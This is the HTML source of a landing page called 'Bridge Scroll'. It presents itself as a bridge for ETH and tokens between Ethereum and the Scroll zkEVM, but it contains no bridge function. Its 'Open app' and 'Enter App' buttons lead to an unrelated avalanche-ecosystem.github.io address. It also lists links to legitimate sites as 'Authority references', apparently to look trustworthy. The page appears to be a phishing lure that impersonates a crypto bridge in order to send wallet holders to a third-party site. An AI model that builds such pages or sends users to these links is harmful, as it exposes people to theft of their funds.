<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bridge Scroll</title>
  <meta name="description" content="Bridge Scroll moves ETH and tokens between Ethereum and the Scroll zkEVM from your own wallet.">
  <link rel="canonical" href="https://bridge-scroll.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F3EE">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Bridge Scroll">
  <meta property="og:description" content="Bridge Scroll moves ETH and tokens between Ethereum and the Scroll zkEVM from your own wallet.">
  <meta property="og:url" content="https://bridge-scroll.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Bridge Scroll">
  <meta name="twitter:description" content="Bridge Scroll moves ETH and tokens between Ethereum and the Scroll zkEVM from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://bridge-scroll.github.io/#website",
        "url": "https://bridge-scroll.github.io/",
        "name": "Bridge Scroll",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://bridge-scroll.github.io/#organization",
        "name": "Bridge Scroll",
        "url": "https://bridge-scroll.github.io/",
        "logo": "https://bridge-scroll.github.io/favicon.png"
      },
      {
        "@type": "WebApplication",
        "@id": "https://bridge-scroll.github.io/#webapplication",
        "name": "Bridge Scroll",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://bridge-scroll.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Bridge Scroll">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Bridge Scroll</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://scrollscan.com/" target="_blank" rel="nofollow noopener noreferrer">Scrollscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://l2beat.com/scaling/projects/scroll" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>
    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Bridge Scroll</h1>
      <p class="value"><strong>Bridge Scroll</strong> moves ETH and tokens between Ethereum and the Scroll zkEVM from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="30" height="30" alt="Ethereum">
            <span>Ethereum</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="scroll.png" width="30" height="30" alt="Scroll">
            <span>Scroll</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Bridge Scroll &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
